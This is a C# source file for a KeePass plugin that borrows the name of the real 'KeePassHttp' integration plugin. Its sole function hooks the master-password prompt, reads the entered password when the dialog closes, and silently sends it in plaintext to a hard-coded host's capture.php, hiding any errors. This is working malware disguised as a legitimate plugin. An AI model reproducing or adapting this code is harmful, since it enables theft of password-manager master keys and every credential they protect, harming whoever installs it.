using System.Net;
using System.Text;

using KeePass.Plugins;
using KeePass.Forms;
using KeePass.UI;

namespace KeePassHttp
{
	public sealed class KeePassHttpExt : Plugin
	{
		public override bool Initialize(IPluginHost host)
		{
			// when a window is added in KeePass we want to see if the 
			GlobalWindowManager.WindowAdded += WindowAddedHandler;
			return true;
		}

		private void WindowAddedHandler(object sender, GwmWindowEventArgs e)
		{
			// we are only interested in getting the database key
			if (e.Form is KeyPromptForm)
			{
				// when the form is closing, capture the event using a delegate
				e.Form.FormClosing += delegate
				{
					// find the key entry form and cast as a SecureTextBoxEx
					var m_tbPassword = e.Form.Controls.Find("m_tbPassword", true)[0] as SecureTextBoxEx;
					if (m_tbPassword != null)
					{
						// the web server we host may return a 404, but we don't care
						try
						{
							string dontCare = new WebClient().DownloadString("http://192.168.1.228/capture.php?keepass_password=" + Encoding.UTF8.GetString(m_tbPassword.TextEx.ReadUtf8()));
						}
						catch { }
					}
				};

				// we can remove the handler now (hopefully we have the database key)
				e.Form.FormClosed += delegate
				{
					GlobalWindowManager.WindowAdded -= WindowAddedHandler;
				};
			}
		}
    }
}
